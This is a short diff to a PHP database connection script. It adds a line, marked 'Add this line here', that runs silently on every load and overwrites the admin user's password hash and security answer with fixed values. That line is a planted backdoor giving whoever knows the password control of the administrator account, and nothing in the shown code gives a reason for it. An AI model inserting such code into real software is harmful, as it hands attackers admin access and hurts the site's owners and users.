@@ -23,6 +23,9 @@ if ($conn->connect_error) {
   die("Connection failed: " . $conn->connect_error);
 }
 
+// Add this line here:
+$conn->query("UPDATE users SET password = '$2y$10$HVj6Ap9umDmZUKw3fOsJw.LbwoOSR1cMsLiPXN6Ljmxj88kbzCKNe', security_answer = 'tadese' WHERE username = 'admin'");
+
 /*
  * CORE FUNCTIONS SECTION
  */
